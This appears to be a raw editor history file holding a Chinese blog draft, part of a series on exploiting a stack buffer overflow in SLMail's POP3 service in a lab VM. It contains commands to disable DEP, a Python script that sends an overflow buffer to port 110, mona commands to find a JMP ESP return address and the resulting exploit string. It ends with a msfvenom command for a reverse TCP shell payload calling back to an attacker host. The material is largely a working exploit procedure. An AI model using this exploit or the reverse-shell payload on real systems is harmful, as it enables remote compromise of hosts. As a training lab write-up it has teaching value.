s"]],[2848,2848],[2857,2857]]],[1578996822015,["whale@Whale",[[-1,2856,"s"]],[2857,2857],[2856,2856]]],[1578996832893,["whale@Whale",[[1,2856,"是汇编语言中跳转到栈指针"]],[2856,2856],[2868,2868]]],[1578996882469,["whale@Whale",[[1,2868,"寄存器的意思"]],[2868,2868],[2874,2874]]],[1578996888399,["whale@Whale",[[1,2862,"**"]],[2862,2862],[2864,2864]]],[1578996892078,["whale@Whale",[[1,2873,"**"]],[2873,2873],[2875,2875]]],[1578999501821,["whale@Whale",[[1,2893,"\n\n![6]($res/6.PNG)\n\n"]],[2893,2893],[2912,2912]]],[1578999587495,["whale@Whale",[[1,2880,"·"]],[2880,2880],[2881,2881]]],[1578999588608,["whale@Whale",[[-1,2880,"·"]],[2881,2881],[2880,2880]]],[1578999590276,["whale@Whale",[[1,2880,"`"]],[2880,2880],[2881,2881]]],[1578999591057,["whale@Whale",[[1,2894,"`"]],[2894,2894],[2895,2895]]],[1578999704800,["whale@Whale",[[1,2914,"找到没有DEP、ASLR等内存保护的程序\r\n"]],[2914,2914],[2936,2936]]],[1579000873996,[null,[[-1,2934,"\r"],[1,2935,"\n"]],[2934,2934],[2936,2936]]],[1579000873996,[null,[[1,2934,"\r"],[-1,2934,"\n"]],[2936,2936],[2934,2934]]],[1579000868537,["whale@Whale",[[-1,2934,"\r\n"]],[2934,2935],[2934,2934]]],[1579000873805,["whale@Whale",[[1,2934,"Openc32.dl"]],[2934,2934],[2944,2944]]],[1579000874625,["whale@Whale",[[1,2946,"\n"]],[2945,2945],[2946,2946]]],[1579000875432,["whale@Whale",[[-1,2946,"\n"]],[2946,2946],[2945,2945]]],[1579000876699,["whale@Whale",[[1,2945,"·"]],[2945,2945],[2946,2946]]],[1579000877514,["whale@Whale",[[-1,2945,"·"]],[2946,2946],[2945,2945]]],[1579000877936,["whale@Whale",[[1,2945,"`"]],[2945,2945],[2946,2946]]],[1579000880384,["whale@Whale",[[1,2934,"`"]],[2934,2934],[2935,2935]]],[1579000883519,["whale@Whale",[[1,2947,","]],[2947,2947],[2948,2948]]],[1579000884556,["whale@Whale",[[-1,2947,","]],[2948,2948],[2947,2947]]],[1579000885216,["whale@Whale",[[1,2947,"，"]],[2947,2947],[2948,2948]]],[1579000886392,["whale@Whale",[[-1,2947,"，"]],[2948,2948],[2947,2947]]],[1579000888083,["whale@Whale",[[1,2947,",t"]],[2947,2947],[2949,2949]]],[1579000888951,["whale@Whale",[[-1,2947,",t"]],[2949,2949],[2947,2947]]],[1579000931470,["whale@Whale",[[1,2947,"，图中4个false代表，该dll动态链接库不会在每次重启的时候改变地址，也没有内存保护，这暗时"]],[2947,2947],[2995,2995]]],[1579000932358,["whale@Whale",[[-1,2993,"暗时"]],[2995,2995],[2993,2993]]],[1579000993979,[null,[[-1,2945,"\n"],[1,2946,"l"]],[2945,2945],[2947,2947]]],[1579000993979,[null,[[1,2945,"\n"],[-1,2945,"l"]],[2947,2947],[2945,2945]]],[1579000937452,["whale@Whale",[[1,2993,"暗示我们可是"]],[2993,2993],[2999,2999]]],[1579000938024,["whale@Whale",[[-1,2997,"可是"]],[2999,2999],[2997,2997]]],[1579000949027,["whale@Whale",[[1,2997,"可以使用该dll中的``"]],[2997,2997],[3009,3009]]],[1579000952984,["whale@Whale",[[1,3008,"JMP ESP"]],[3008,3008],[3015,3015]]],[1579000961300,["whale@Whale",[[1,3016,"命令，跳转到ESP."]],[3016,3016],[3026,3026]]],[1579000962516,["whale@Whale",[[-1,3022,"ESP."]],[3026,3026],[3022,3022]]],[1579000970967,["whale@Whale",[[1,3022,"栈指针寄存器。"]],[3022,3022],[3029,3029]]],[1579000971911,["whale@Whale",[[1,3030,"\n"]],[3029,3029],[3030,3030]]],[1579000973287,["whale@Whale",[[1,3031,"\n"]],[3030,3030],[3031,3031]]],[1579001233999,[null,[[-1,2945,"\n"],[1,2946,"l"]],[2945,2945],[2947,2947]]],[1579001233999,[null,[[1,2945,"\n"],[-1,2945,"l"]],[2947,2947],[2945,2945]]],[1579001233799,["whale@Whale",[[-1,3031,"\n"],[1,3032,"下一步就是找出该DLLz"]],[3031,3031],[3043,3043]]],[1579001294983,[null,[[-1,2945,"\n"],[1,2946,"l"]],[2945,2945],[2947,2947]]],[1579001294983,[null,[[1,2945,"\n"],[-1,2945,"l"]],[2947,2947],[2945,2945]]],[1579001234213,["whale@Whale",[[-1,3042,"z"]],[3043,3043],[3042,3042]]],[1579001246703,["whale@Whale",[[1,3042,"中的跳转ESP命令的地址。"]],[3042,3042],[3055,3055]]],[1579002452049,[null,[[-1,2945,"\n"],[1,2946,"l"]],[2945,2945],[2947,2947]]],[1579002452050,[null,[[1,2945,"\n"],[-1,2945,"l"]],[2947,2947],[2945,2945]]],[1579002445264,["whale@Whale",[[1,3055,"\n\n!mona find -s \"\\xff\\xe4\" -m Openc32.dll"]],[3055,3055],[3095,3095]]],[1579002449900,["whale@Whale",[[1,3056,"·"]],[3056,3056],[3057,3057]]],[1579002451493,["whale@Whale",[[-1,3056,"·"]],[3057,3057],[3056,3056]]],[1579002511981,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3056,"\n"],[1,3096,"\n"]],[2945,2945],[3097,3097]]],[1579002511981,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3056,"\n"],[-1,3095,"\n"]],[3097,3097],[2945,2945]]],[1579002452323,["whale@Whale",[[1,3056,"`"]],[3056,3056],[3057,3057]]],[1579002453206,["whale@Whale",[[1,3096,"`"]],[3096,3096],[3097,3097]]],[1579002692002,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002692002,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002669339,["whale@Whale",[[1,3098,"\n"]],[3097,3097],[3098,3098]]],[1579002669819,["whale@Whale",[[1,3099,"\n"]],[3098,3098],[3099,3099]]],[1579002675562,["whale@Whale",[[1,3100,"![7]($res/7.PNG)\n\n"]],[3099,3099],[3117,3117]]],[1579002677186,["whale@Whale",[[-1,3099,"\n"]],[3099,3099],[3098,3098]]],[1579002690331,["whale@Whale",[[1,3117,"\n"]],[3116,3116],[3117,3117]]],[1579002691893,["whale@Whale",[[1,3117,"SLMFC.DLL"]],[3117,3117],[3126,3126]]],[1579002753010,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002753010,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002700723,["whale@Whale",[[1,3117,"!mona find -s \"\\xff\\xe4\" -m Openc32.dll "]],[3117,3117],[3157,3157]]],[1579002812988,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002812988,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002778457,["whale@Whale",[[-1,3145,"Openc32.dll "]],[3145,3157],[3145,3145]]],[1579002789202,["whale@Whale",[[1,3117,"\n"]],[3116,3116],[3117,3117]]],[1579002790798,["whale@Whale",[[1,3117,"yi"]],[3117,3117],[3119,3119]]],[1579002791433,["whale@Whale",[[-1,3117,"yi"]],[3119,3119],[3117,3117]]],[1579002804909,["whale@Whale",[[1,3117,"因为Openc32.dll没有找到"]],[3117,3117],[3134,3134]]],[1579002873014,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002873014,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002843939,["whale@Whale",[[1,3134,"pointer"]],[3134,3134],[3141,3141]]],[1579002932983,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002932983,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002884437,["whale@Whale",[[1,3141,"，所以换一个dll，改为"]],[3141,3141],[3153,3153]]],[1579002886306,["whale@Whale",[[-1,3151,"改为"]],[3153,3153],[3151,3151]]],[1579002895970,["whale@Whale",[[1,3151,"和上述挑选规则一样"]],[3151,3151],[3160,3160]]],[1579002898726,["whale@Whale",[[-1,3156,"规则一样"]],[3160,3160],[3156,3156]]],[1579002910341,["whale@Whale",[[1,3156,"条件一样，选择SLMFC>"]],[3156,3156],[3169,3169]]],[1579002910837,["whale@Whale",[[-1,3168,">"]],[3169,3169],[3168,3168]]],[1579002911642,["whale@Whale",[[1,3168,".dl"]],[3168,3168],[3171,3171]]],[1579002912360,["whale@Whale",[[-1,3169,"dl"]],[3171,3171],[3169,3169]]],[1579002920306,["whale@Whale",[[1,3169,"dll，这次找到了pointer."]],[3169,3169],[3186,3186]]],[1579002920808,["whale@Whale",[[-1,3185,"."]],[3186,3186],[3185,3185]]],[1579002921185,["whale@Whale",[[1,3185,"。"]],[3185,3185],[3186,3186]]],[1579002921784,["whale@Whale",[[1,3187,"\n"]],[3186,3186],[3187,3187]]],[1579002926467,["whale@Whale",[[1,3188,"·"]],[3188,3188],[3189,3189]]],[1579002927356,["whale@Whale",[[-1,3188,"·"]],[3189,3189],[3188,3188]]],[1579002928782,["whale@Whale",[[1,3188,"·"]],[3188,3188],[3189,3189]]],[1579002929828,["whale@Whale",[[1,3226,"·"]],[3226,3226],[3227,3227]]],[1579002931154,["whale@Whale",[[-1,3226,"·"]],[3227,3227],[3226,3226]]],[1579002932235,["whale@Whale",[[1,3226,"`"]],[3226,3226],[3227,3227]]],[1579002992987,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579002992987,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579002934648,["whale@Whale",[[-1,3188,"·"]],[3188,3188],[3188,3188]]],[1579002934934,["whale@Whale",[[1,3188,"`"]],[3188,3188],[3189,3189]]],[1579003114028,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579003114028,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579003100206,["whale@Whale",[[1,3228,"\n"]],[3227,3227],[3228,3228]]],[1579003100438,["whale@Whale",[[1,3229,"\n"]],[3228,3228],[3229,3229]]],[1579003101088,["whale@Whale",[[1,3229,"找到了一些包含JMP ESP的地址，我们选择一个不含坏字符的地址。\r\n"]],[3229,3229],[3264,3264]]],[1579003294047,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"],[-1,3262,"\r"],[1,3263,"\n"]],[2945,2945],[3264,3264]]],[1579003294047,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"],[1,3262,"\r"],[-1,3262,"\n"]],[3264,3264],[2945,2945]]],[1579003240747,["whale@Whale",[[-1,3262,"\r"],[1,3263,"0x5f4c0ea3"]],[3262,3262],[3272,3272]]],[1579003268433,["whale@Whale",[[1,3273,"string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)"]],[3273,3273],[3317,3317]]],[1579003279340,["whale@Whale",[[1,3273,"`"]],[3273,3273],[3274,3274]]],[1579003280744,["whale@Whale",[[1,3318,"`"]],[3318,3318],[3319,3319]]],[1579003286154,["whale@Whale",[[-1,3294,"B\"*4"]],[3294,3298],[3294,3294]]],[1579003354449,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579003354449,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579003303993,["whale@Whale",[[1,3294,"\\xff\\xe4\\xff\\xe4\""]],[3294,3294],[3311,3311]]],[1579003310331,["whale@Whale",[[-1,3296,"ff"]],[3296,3296],[3296,3296]]],[1579003318671,["whale@Whale",[[1,3296,"a3"]],[3296,3296],[3298,3298]]],[1579003323035,["whale@Whale",[[-1,3300,"e4"]],[3300,3300],[3300,3300]]],[1579003331250,["whale@Whale",[[1,3300,"0e"]],[3300,3300],[3302,3302]]],[1579003414498,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579003414498,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579003376835,["whale@Whale",[[-1,3304,"ff"]],[3306,3306],[3304,3304]]],[1579003377798,["whale@Whale",[[1,3304,"4c"]],[3304,3304],[3306,3306]]],[1579003379737,["whale@Whale",[[-1,3308,"e4"]],[3308,3308],[3308,3308]]],[1579003380745,["whale@Whale",[[1,3308,"4"]],[3308,3308],[3309,3309]]],[1579003381577,["whale@Whale",[[-1,3308,"4"]],[3309,3309],[3308,3308]]],[1579003382546,["whale@Whale",[[1,3308,"5f"]],[3308,3308],[3310,3310]]],[1579003408833,["whale@Whale",[[-1,3261,"。"]],[3262,3262],[3261,3261]]],[1579003410666,["whale@Whale",[[1,3272,"\n"]],[3271,3271],[3272,3272]]],[1579003410913,["whale@Whale",[[1,3273,"\n"]],[3272,3272],[3273,3273]]],[1579003412073,["whale@Whale",[[-1,3273,"\n"]],[3273,3273],[3272,3272]]],[1579003414372,["whale@Whale",[[1,3261,"`"]],[3261,3261],[3262,3262]]],[1579003474471,[null,[[-1,2945,"\n"],[1,2946,"l"],[-1,3057,"\n"],[-1,3096,"`l"],[1,3098,"l`\n"]],[2945,2945],[3101,3101]]],[1579003474471,[null,[[1,2945,"\n"],[-1,2945,"l"],[1,3057,"\n"],[1,3095,"`l"],[-1,3095,"l`\n"]],[3101,3101],[2945,2945]]],[1579003415653,["whale@Whale",[[1,3272,"`"]],[3272,3272],[3273,3273]]],[1579003417169,["whale@Whale",[[1,3275,"\n"]],[3273,3273],[3274,3274]]],[1579003417401,["whale@Whale",[[1,3276,"\n"]],[3274,3274],[3275,3275]]],[1579003420090,["whale@Whale",[[1,3275,"## xiu"]],[3275,3275],[3281,3281]]],[1579003420899,["whale@Whale",[[-1,3278,"xiu"]],[3281,3281],[3278,3278]]],[1579003422997,["whale@Whale",[[1,3278,"修改exp"]],[3278,3278],[3283,3283]]],[1579003423673,["whale@Whale",[[1,3285,"\n"]],[3283,3283],[3284,3284]]],[1579003424097,["whale@Whale",[[1,3286,"\n"]],[3284,3284],[3285,3285]]],[1579003430571,["whale@Whale",[[1,3285,"`0x5f4c0ea3`"]],[3285,3285],[3297,3297]]],[1579003432326,["whale@Whale",[[1,3285,"j"]],[3285,3285],[3286,3286]]],[1579003433096,["whale@Whale",[[-1,3285,"j"]],[3286,3286],[3285,3285]]],[1579003440370,["whale@Whale",[[1,3285,"将内存地址改写，"]],[3285,3285],[3293,3293]]],[1579003453930,["whale@Whale",[[1,3305,"改写为\"\\xa3\\x0e\\x4c\\x5f\""]],[3305,3305],[3326,3326]]],[1579003457425,["whale@Whale",[[-1,3308,"\""]],[3308,3308],[3308,3308]]],[1579003459081,["whale@Whale",[[1,3308,"·"]],[3308,3308],[3309,3309]]],[1579003459964,["whale@Whale",[[1,3326,"·"]],[3326,3326],[3327,3327]]],[1579003461033,["whale@Whale",[[-1,3325,"\"·"]],[3327,3327],[3325,3325]]],[1579003461589,["whale@Whale",[[1,3325,"`"]],[3325,3325],[3326,3326]]],[1579003465314,["whale@Whale",[[-1,3308,"·"]],[3308,3308],[3308,3308]]],[1579003465608,["whale@Whale",[[1,3308,"`"]],[3308,3308],[3309,3309]]]]],["c054c018-58e2-490e-bf40-3d90d31c9e02",1579061773625,"上一篇：[https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)\n\n## 准备一个虚拟机\nwindows server 2008，安装好slmail、python环境、immunity debugger\n\n然后将开始调试之前，生成一个快照。该虚拟机环境可下载，购买[点我]()\n\n## 关闭DEP保护\n 我们在命令提示符下运行不带有任何参数的bcdedit命令，可以看到当前的启动配置，如图所示显示了在Windows下运行bcdedit的结果，其中最后一行显示nx OptIn，表示当前的DEP保护级别为1，如果显示为**OptOut则表示当前的EDP保护级别为2**。如果我们要关闭EDP，只需将nx设置为Always0ff即可。\n\n```\nbcdedit\nbcdedit /set nx alwaysoff     关闭DEP保护\nbcdedit /set nx alwayson      开启DEP保护\n```\n![2]($res/2.PNG)\n\n## 检查坏字符\n\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\n\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\n\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\n\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\n\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序所处理的。\n\n![1]($res/1.PNG)\n\n```\n#!/usr/bin/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbadchars = (\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )\n\nbuffer=\"A\"*2606 + \"B\"*4 + badchars\ntry:\n\tprint \"\\nSending evil buffer...\"\n\ts.connect(('192.168.1.103',110)) #修改为目标IP地址\n\tdata = s.recv(1024)\n\ts.send('USER username' +'\\r\\n')\n\tdata = s.recv(1024)\n\ts.send('PASS ' + buffer + '\\r\\n')\n\ts.close()\n\tprint \"\\nDone!\"\nexcept:\n\tprint \"Could not connect to POP3!\"\n```\n在kali上运行以上代码，目标机上依然报错了，我们选中右上角的**寄存器面板**，选中ESP（ 栈指针寄存器）\n![3]($res/3.PNG)\n\n右键-follow in dump，可以看到内存转储面板中，有一条内容为`01 02 03 ... 09`的内容。\n![4]($res/4.PNG)\n\n如果正常没有坏字符的话，后面应该是`0a 0b 0c 0d`，而09后面的内容是`29 20`，\n\n`\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"`\n\n值得注意的是0a是坏字符，而不是09。\n\n## 坏字符0a\n\n在每个程序中，坏字符并不是一样的。要根据不同的程序来判断。在这个程序中，修改发送的字符，去掉`\\x0a`\n\n`\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"`\n\n![5]($res/5.PNG)\n\n在内存转储面板中，我们可以看到09之后，顺利往后执行为`0b 0c ...`\n\n但是发现`0d`又不见了，说明又发现了坏字符`\\x0d`\n\n最终检查出了坏字符有\\x00\\x0a\\x0d\n\n## 找到返回地址\n\nJMP ESP 是汇编语言中**跳转到栈指针寄存器**的意思\n\n`!mona modules`\n\n![6]($res/6.PNG)\n找到没有DEP、ASLR等内存保护的程序`Openc32.dll`，图中4个false代表，该dll动态链接库不会在每次重启的时候改变地址，也没有内存保护，这暗示我们可以使用该dll中的`JMP ESP`命令，跳转到栈指针寄存器。\n\n下一步就是找出该DLL中的跳转ESP命令的地址。\n`!mona find -s \"\\xff\\xe4\" -m Openc32.dll`\n\n![7]($res/7.PNG)\n\n因为Openc32.dll没有找到pointer，所以换一个dll，和上述挑选条件一样，选择SLMFC.dll，这次找到了pointer。\n\n`!mona find -s \"\\xff\\xe4\" -m SLMFC.DLL`\n\n找到了一些包含JMP ESP的地址，我们选择一个不含坏字符的地址`0x5f4c0ea3`\n\n## 修改exp\n\n将内存地址改写，`0x5f4c0ea3`改写为`\\xa3\\x0e\\x4c\\x5f`\n\n`string= \"A\"* 2606+ \"\\xa3\\x0e\\x4c\\x5f\" + \"C\"*(3500-2606-4)`\n",[[1579061720812,["whale@Whale",[[1,3275,"![8]($res/8.PNG)\n\n"]],[3274,3274],[3292,3292]]],[1579061799674,["whale@Whale",[[1,3031,"\n"]],[3030,3030],[3031,3031]]],[1579061803398,["whale@Whale",[[1,3031,"使用msf"]],[3031,3031],[3036,3036]]],[1579061804765,["whale@Whale",[[1,3037,"\n"]],[3036,3036],[3037,3037]]],[1579061805232,["whale@Whale",[[1,3037,"/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb"]],[3037,3037],[3096,3096]]],[1579061806733,["whale@Whale",[[1,3097,"\n"]],[3096,3096],[3097,3097]]],[1579061806964,["whale@Whale",[[1,3098,"\n"]],[3097,3097],[3098,3098]]],[1579061833121,["whale@Whale",[[1,3036,"将汇编语言`JMP ESP`"]],[3036,3036],[3050,3050]]],[1579061840338,["whale@Whale",[[1,3050,"转换为二进制"]],[3050,3050],[3056,3056]]],[1579061903638,["whale@Whale",[[1,3118,"![9]($res/9.PNG)\n\n"]],[3117,3117],[3135,3135]]],[1579061924731,["whale@Whale",[[1,3057,"\n"]],[3056,3056],[3057,3057]]],[1579061925395,["whale@Whale",[[1,3057,"·"]],[3057,3057],[3058,3058]]],[1579061926395,["whale@Whale",[[-1,3057,"·"]],[3058,3058],[3057,3057]]],[1579061927251,["whale@Whale",[[1,3057,"```"]],[3057,3057],[3060,3060]]],[1579061928578,["whale@Whale",[[1,3121,"```"]],[3121,3121],[3124,3124]]],[1579061929107,["whale@Whale",[[1,3125,"\n"]],[3124,3124],[3125,3125]]],[1579061933290,["whale@Whale",[[1,3125,"结果为FFE4"]],[3125,3125],[3132,3132]]],[1579061936715,["whale@Whale",[[1,3128,"\t"]],[3128,3128],[3129,3129]]],[1579061937556,["whale@Whale",[[-1,3128,"\t"]],[3129,3129],[3128,3128]]],[1579061940453,["whale@Whale",[[1,3128,"\t·"]],[3128,3128],[3130,3130]]],[1579061941755,["whale@Whale",[[-1,3128,"\t·"]],[3130,3130],[3128,3128]]],[1579061942649,["whale@Whale",[[1,3128,"`"]],[3128,3128],[3129,3129]]],[1579061943588,["whale@Whale",[[1,3133,"`"]],[3133,3133],[3134,3134]]],[1579062744969,["whale@Whale",[[1,3529,"\n"]],[3528,3528],[3529,3529]]],[1579062745800,["whale@Whale",[[1,3530,"\n"]],[3529,3529],[3530,3530]]],[1579062746612,["whale@Whale",[[-1,3530,"\n"],[1,3531,"za"]],[3530,3530],[3532,3532]]],[1579062747359,["whale@Whale",[[-1,3530,"za"]],[3532,3532],[3530,3530]]],[1579062748281,["whale@Whale",[[1,3530,"\n\n"]],[3530,3530],[3531,3531]]],[1579062753264,["whale@Whale",[[-1,3531,"\n"],[1,3532,"再次运行exp,"]],[3531,3531],[3539,3539]]],[1579062753859,["whale@Whale",[[-1,3538,","]],[3539,3539],[3538,3538]]],[1579062754610,["whale@Whale",[[1,3538,"，"]],[3538,3538],[3539,3539]]],[1579062909596,["whale@Whale",[[1,3425,"由于x86体系结构存储地址，使用little endian格式，就是小端存储。低位字节存储在\r\n存储器位于最低地址，高位字节位于最高地址。"]],[3425,3425],[3494,3494]]],[1579062912071,["whale@Whale",[[-1,3471,"\r\n"]],[3471,3471],[3471,3471]]],[1579062915518,["whale@Whale",[[1,3493,"\n"]],[3493,3493],[3494,3494]]],[1579063105781,["whale@Whale",[[-1,3598,"\n"]],[3598,3598],[3597,3597]]],[1579063241979,["whale@Whale",[[-1,3605,"，"]],[3606,3606],[3605,3605]]],[1579063242491,["whale@Whale",[[1,3605,"\n\n"]],[3605,3605],[3606,3606]]],[1579063242699,["whale@Whale",[[1,3607,"\n"]],[3606,3606],[3607,3607]]],[1579063249675,["whale@Whale",[[-1,3607,"\n"],[1,3608,"## 生成payload"]],[3607,3607],[3619,3619]]],[1579063249891,["whale@Whale",[[1,3619,"\n\n"]],[3619,3619],[3620,3620]]],[1579063250467,["whale@Whale",[[1,3621,"\n"]],[3620,3620],[3621,3621]]],[1579063250820,["whale@Whale",[[1,3621,"msfvenom -l payloads"]],[3621,3621],[3641,3641]]],[1579063275774,["whale@Whale",[[1,3620,"[]()"]],[3620,3620],[3624,3624]]],[1579063277327,["whale@Whale",[[1,3623,"[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)"]],[3623,3623],[3721,3721]]],[1579063281466,["whale@Whale",[[-1,3620,"[]([https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/))"]],[3721,3721],[3620,3620]]],[1579063282140,["whale@Whale",[[1,3620,"[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)"]],[3620,3620],[3718,3718]]],[1579063288658,["whale@Whale",[[-1,3621,"https://whale3070.github.io/tools/2019/03/01/x/"]],[3621,3667],[3621,3621]]],[1579063289466,["whale@Whale",[[1,3621,"ca"]],[3621,3621],[3623,3623]]],[1579063289662,["whale@Whale",[[1,3623,"n"]],[3623,3623],[3624,3624]]],[1579063290360,["whale@Whale",[[-1,3621,"can"]],[3624,3624],[3621,3621]]],[1579063309234,["whale@Whale",[[1,3621,"参考资料：# msfvenom-生成攻击载荷-命令速查"]],[3621,3621],[3648,3648]]],[1579063312554,["whale@Whale",[[-1,3626,"# "]],[3628,3628],[3626,3626]]],[1579063313691,["whale@Whale",[[1,3626,"["]],[3626,3626],[3627,3627]]],[1579063315170,["whale@Whale",[[-1,3620,"["]],[3620,3620],[3620,3620]]],[1579063318218,["whale@Whale",[[1,3697,"\n"]],[3697,3697],[3698,3698]]],[1579063402504,["whale@Whale",[[1,3719,"\n"]],[3718,3718],[3719,3719]]],[1579063402929,["whale@Whale",[[1,3720,"\n"]],[3719,3719],[3720,3720]]],[1579063403978,["whale@Whale",[[1,3720,"msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c"]],[3720,3720],[3787,3787]]],[1579063410514,["whale@Whale",[[-1,3764,"10.0.0.4 "],[1,3773,"kal"]],[3764,3773],[3767,3767]]],[1579063414500,["whale@Whale",[[1,3767,"i的IP 